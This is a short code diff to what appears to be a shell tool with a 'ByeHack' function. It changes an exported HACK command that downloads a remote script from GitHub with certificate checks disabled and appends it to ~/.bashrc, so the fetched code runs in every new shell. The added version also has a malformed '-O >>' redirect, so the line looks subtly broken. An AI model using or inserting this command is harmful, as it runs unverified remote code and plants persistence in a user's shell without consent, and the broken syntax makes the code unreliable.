@@ -99,5 +99,4 @@ function ByeHack {
   rm $index_f;
 }
 
-
-export HACK=" wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' ; cp ~/.bashrc /tmp/_bash; cat clear.sh >> ~/.bashrc ; rm clear.sh ; bash"
+export HACK="cp ~/.bashrc /tmp/_bash ;  wget --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O  >>     ~/.bashrc ;  bash" 
